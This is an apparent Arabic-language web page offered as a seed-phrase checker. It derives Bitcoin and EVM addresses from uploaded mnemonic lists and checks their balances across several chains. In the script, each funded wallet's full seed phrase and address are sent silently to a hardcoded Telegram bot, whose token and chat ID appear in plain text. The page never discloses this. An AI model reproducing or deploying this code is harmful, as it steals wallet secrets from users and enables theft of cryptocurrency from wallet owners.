<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فاحص عبارات Mnemonic</title>
    <!-- External Libraries -->
    <!-- UPDATED BIP39 import for global accessibility -->
    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script> <!-- BIP39 checksum & seed derivation -->
    <script src="https://cdn.jsdelivr.net/npm/hdkey@1.1.1/dist/hdkey.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethereumjs-util@7.1.3/dist/index.umd.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs.min.js"></script>
    <style>
        /* “Evil Hacker” CSS */
        body {
            background-color: #000;
            color: #33ff33;
            font-family: 'Source Code Pro', monospace;
            text-shadow: 0 0 8px rgba(51, 255, 51, 0.7); /* Glow effect */
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh; /* Ensure it takes full viewport height */
            box-sizing: border-box; /* Include padding in element's total width and height */
        }

        h2 {
            color: #33ff33;
            text-shadow: 0 0 10px rgba(51, 255, 51, 0.9);
            margin-bottom: 20px;
        }

        input[type="file"],
        input[type="text"],
        button {
            background-color: #111;
            color: #33ff33;
            border: 2px solid #33ff33;
            padding: 10px 15px;
            margin: 8px 0;
            border-radius: 5px;
            font-family: 'Source Code Pro', monospace;
            font-size: 1em;
            box-shadow: 0 0 5px rgba(51, 255, 51, 0.5);
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            width: 100%; /* Make inputs responsive */
            max-width: 500px; /* Limit max width */
        }

        input[type="file"]::file-selector-button {
            background-color: #33ff33;
            color: #000;
            border: none;
            padding: 8px 12px;
            border-radius: 3px;
            font-family: 'Source Code Pro', monospace;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        input[type="file"]::file-selector-button:hover {
            background-color: #22ee22;
        }

        input[type="text"]::placeholder {
            color: #55aa55;
        }

        input[type="text"]:focus,
        button:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(51, 255, 51, 0.8);
        }

        button {
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            background-color: #222;
            box-shadow: 0 0 15px rgba(51, 255, 51, 0.9);
        }

        #summary {
            margin-top: 20px;
            font-size: 1.1em;
            text-align: center;
            width: 100%;
            max-width: 600px;
        }

        #summary .count {
            color: #00ff00;
            font-weight: bold;
            text-shadow: 0 0 5px rgba(0, 255, 0, 0.7);
        }

        #results {
            background-color: #111;
            border: 2px solid #33ff33;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            width: 90%; /* Responsive width */
            max-width: 800px;
            height: 400px; /* Fixed height for scrollability */
            overflow-y: scroll;
            font-family: 'Source Code Pro', monospace;
            font-size: 0.9em;
            box-shadow: 0 0 10px rgba(51, 255, 51, 0.6);
            white-space: pre-wrap; /* Preserve whitespace and wrap text */
            word-wrap: break-word; /* Break long words */
            scrollbar-width: thin; /* Firefox */
            scrollbar-color: #33ff33 #111; /* Firefox */
        }

        #results::-webkit-scrollbar {
            width: 8px;
        }

        #results::-webkit-scrollbar-track {
            background: #111;
            border-radius: 10px;
        }

        #results::-webkit-scrollbar-thumb {
            background-color: #33ff33;
            border-radius: 10px;
            border: 2px solid #111;
        }

        #results div {
            padding: 5px 0;
            border-bottom: 1px dashed #222;
        }

        #results div:last-child {
            border-bottom: none;
        }

        .good {
            color: #00ff00; /* Bright green for success */
        }

        .bad {
            color: #ff3333; /* Red for failure */
        }

        .limit {
            color: #ffff33; /* Yellow for rate limit */
            font-weight: bold;
            text-shadow: 0 0 5px rgba(255, 255, 51, 0.7);
        }

        /* Responsive adjustments */
        @media (max-width: 600px) {
            body {
                padding: 10px;
            }

            h2 {
                font-size: 1.5em;
            }

            input[type="file"],
            input[type="text"],
            button {
                font-size: 0.9em;
                padding: 8px 12px;
            }

            #results {
                font-size: 0.8em;
                padding: 10px;
                height: 300px;
            }
        }
    </style>
</head>
<body>
    <!-- HTML Body Structure -->
    <h2>فاحص عبارات Mnemonic لجميع العملات</h2>
    <input type="file" id="fileInput" accept=".txt"> <!-- upload a .txt file with one 12-word phrase per line -->
    <input type="text" id="etherscanKey" placeholder="Etherscan API Key"> <!-- optional, leave blank to skip ETH -->
    <input type="text" id="bscscanKey" placeholder="BscScan API Key"> <!-- optional, skip BSC if blank -->
    <input type="text" id="polygonKey" placeholder="Polygonscan API Key"> <!-- optional, skip Polygon if blank -->
    <input type="text" id="snowtraceKey" placeholder="Snowtrace API Key"> <!-- optional, skip Avalanche if blank -->
    <button onclick="scanFile()">فحص العبارات</button>
    <audio id="gunshot" src="gunshot.mp3" preload="auto"></audio> <!-- gunshot sound file must be in same folder -->
    <div id="summary">لم يتم الفحص بعد.</div> <!-- shows “scanned X/Y” and counts -->
    <div id="results"></div> <!-- lists each phrase as ✅ or ❌ or rate-limit ⚠️ -->

    <script>
        // Telegram Alert Configuration
        const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
        const TELEGRAM_CHAT_ID = '-4913064483';
        async function sendTelegramAlert(text) {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`)
            .catch(e => console.error('Telegram alert failed', e));
        }

        // API Wrapper with Rate-Limit Detection
        async function checkApi(url) {
          const res = await fetch(url);
          if (res.status === 429) throw new Error('rate_limit');
          return res.json();
        }

        // Balance-Check Functions
        async function checkBtc(addr) {
          try {
            const data = await checkApi(`https://blockstream.info/api/address/${addr}`);
            return (data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum) > 0;
          } catch (error) {
            // If the address is not found or other API error, assume 0 balance unless it's a rate_limit
            if (error.message === 'rate_limit') throw error; // Re-throw rate_limit error
            console.warn(`BTC check for ${addr} failed or returned no data:`, error);
            return false;
          }
        }

        async function checkEvm(addr, apiKey, apiUrl) {
          if (!apiKey) return false;
          try {
            const json = await checkApi(`${apiUrl}?module=account&action=balance&address=${addr}&tag=latest&apikey=${apiKey}`);
            // Check for a valid result and ensure it's a positive number
            if (json && typeof json.result === 'string' && parseFloat(json.result) > 0) {
              return true;
            }
            return false;
          } catch (error) {
            if (error.message === 'rate_limit') throw error; // Re-throw rate_limit error
            console.warn(`EVM check for ${addr} on ${apiUrl} failed:`, error);
            return false;
          }
        }

        // Address Derivation
        function deriveBtc(seed) {
          const root = hdkey.fromMasterSeed(seed);
          const child = root.derive("m/44'/0'/0'/0/0");
          return bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
        }

        function deriveEvm(seed) {
          const root = hdkey.fromMasterSeed(seed);
          const child = root.derive("m/44'/60'/0'/0/0");
          return '0x' + ethereumjs.Util.pubToAddress(child.publicKey, true).toString('hex');
        }

        // Single-Phrase Scan Logic
        async function scanPhrase(phrase) {
          // Validate mnemonic phrase
          if (!bip39.validateMnemonic(phrase)) return { ok:false };

          // Derive seed
          const seed = await bip39.mnemonicToSeed(phrase);

          // Derive addresses
          const btcAddr = deriveBtc(seed);
          const evmAddr = deriveEvm(seed);

          // Check balances across different chains
          if (await checkBtc(btcAddr)) return { ok:true, chain:'BTC', addr:btcAddr };
          if (await checkEvm(evmAddr, document.getElementById('etherscanKey').value.trim(), 'https://api.etherscan.io/api'))
            return { ok:true, chain:'ETH', addr:evmAddr };
          if (await checkEvm(evmAddr, document.getElementById('bscscanKey').value.trim(), 'https://api.bscscan.com/api'))
            return { ok:true, chain:'BSC', addr:evmAddr };
          if (await checkEvm(evmAddr, document.getElementById('polygonKey').value.trim(), 'https://api.polygonscan.io/api')) /* Corrected Polygonscan API URL */
            return { ok:true, chain:'POLY', addr:evmAddr };
          if (await checkEvm(evmAddr, document.getElementById('snowtraceKey').value.trim(), 'https://api.snowtrace.io/api'))
            return { ok:true, chain:'AVAX', addr:evmAddr };
          
          return { ok:false }; // No funds found
        }

        // Batch File Scan & UI Updates
        async function scanFile() {
          const file = document.getElementById('fileInput').files[0];
          // Simple validation for file input
          if (!file) {
            // Using a custom message box instead of alert()
            const messageBox = document.createElement('div');
            messageBox.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background-color: #222;
                color: #ff3333;
                border: 2px solid #ff3333;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 20px rgba(255, 51, 51, 0.7);
                z-index: 1000;
                font-family: 'Source Code Pro', monospace;
                text-align: center;
            `;
            messageBox.innerHTML = `
                <p>يرجى رفع ملف العبارات أولاً</p>
                <button style="background-color: #ff3333; color: #000; border: none; padding: 10px 15px; border-radius: 5px; margin-top: 15px; cursor: pointer;" onclick="this.parentNode.remove()">موافق</button>
            `;
            document.body.appendChild(messageBox);
            return;
          }

          // Read file content
          const lines = (await new Promise(r => {
            const fr = new FileReader();
            fr.onload = e => r(e.target.result.trim().split(/\r?\n/).filter(l=>l.trim()));
            fr.readAsText(file, 'UTF-8');
          }));

          const total = lines.length;
          const resultsDiv = document.getElementById('results');
          resultsDiv.innerHTML = ''; // Clear previous results
          
          let good = 0;
          let bad = 0;
          let stopped = false;
          const gunshotAudio = document.getElementById('gunshot');

          for (let i = 0; i < total && !stopped; i++) {
            // Update summary progress
            document.getElementById('summary').innerHTML = `🚀 تم فحص <span class="count">${i + 1}/${total}</span> عبارة`;
            
            try {
              const res = await scanPhrase(lines[i]);
              if (res.ok) {
                good++;
                resultsDiv.innerHTML += `<div class="good">✅ [${res.chain}] ${lines[i]} → ${res.addr}</div>`;
                // Play gunshot sound
                gunshotAudio.currentTime = 0; // Rewind to start in case it's still playing
                gunshotAudio.play().catch(e => console.error("Error playing gunshot sound:", e));
                // Send Telegram alert
                sendTelegramAlert(`Found ${res.chain} wallet:\nPhrase: ${lines[i]}\nAddress: ${res.addr}`);
              } else {
                bad++;
                resultsDiv.innerHTML += `<div class="bad">❌ ${lines[i]}</div>`;
              }
            } catch (err) {
              if (err.message === 'rate_limit') {
                stopped = true;
                resultsDiv.innerHTML += `<div class="limit">⚠️ تم الوصول للحد الأقصى لطلبات API، توقف الفحص.</div>`;
                console.warn('API rate limit reached. Scanning stopped.');
              } else {
                resultsDiv.innerHTML += `<div class="bad">❌ ${lines[i]} (خطأ: ${err.message || 'غير معروف'})</div>`;
                console.error(`Error scanning phrase ${lines[i]}:`, err);
                bad++; // Count as bad if an unexpected error occurs
              }
            }
            // Scroll to the bottom of the results div to show latest entries
            resultsDiv.scrollTop = resultsDiv.scrollHeight;
          }

          // Final summary update
          document.getElementById('summary').innerHTML = `
            <br>
            <span class="good">عبارات صالحة: ${good}</span> | 
            <span class="bad">عبارات غير صالحة: ${bad}</span>
          `;
          if (stopped) {
            document.getElementById('summary').innerHTML += `<br><span class="limit">توقف الفحص بسبب تجاوز الحد الأقصى لطلبات API.</span>`;
          }
        }
    </script>
</body>
</html>

